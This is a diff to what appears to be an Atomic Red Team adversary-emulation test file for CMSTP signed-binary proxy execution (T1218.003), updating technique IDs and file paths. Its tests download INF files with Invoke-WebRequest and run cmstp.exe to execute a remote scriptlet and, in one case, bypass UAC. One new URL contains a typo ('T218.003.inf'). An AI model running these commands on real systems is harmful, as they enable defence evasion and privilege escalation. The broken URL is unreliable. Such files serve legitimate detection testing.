@@ -1,6 +1,6 @@
 attack_technique:
 - T1218.003
-display_name: CMSTP
+display_name: 'Signed Binary Proxy Execution: CMSTP'
 atomic_tests:
 - name: CMSTP Executing Remote Scriptlet
   description: |
@@ -11,7 +11,7 @@ atomic_tests:
     inf_file_path:
       description: Path to the INF file
       type: path
-      default: PathToAtomicsFolder\T1191\src\T1191.inf
+      default: PathToAtomicsFolder\T1218.003\src\T1218.003.inf
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -20,7 +20,7 @@ atomic_tests:
       if (Test-Path #{inf_file_path}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{inf_file_path}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1191/src/T1191.inf" -OutFile "#{inf_file_path}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T218.003.inf" -OutFile "#{inf_file_path}"
   executor:
     command: |
       cmstp.exe /s #{inf_file_path}
@@ -34,7 +34,7 @@ atomic_tests:
     inf_file_uac:
       description: Path to the INF file
       type: path
-      default: PathToAtomicsFolder\T1191\src\T1191_uacbypass.inf
+      default: PathToAtomicsFolder\T1218.003\src\T1218.003_uacbypass.inf
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -43,7 +43,7 @@ atomic_tests:
       if (Test-Path #{inf_file_uac}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{inf_file_uac}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1191/src/T1191_uacbypass.inf" -OutFile "#{inf_file_uac}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf" -OutFile "#{inf_file_uac}"
   executor:
     command: |
       cmstp.exe /s #{inf_file_uac} /au
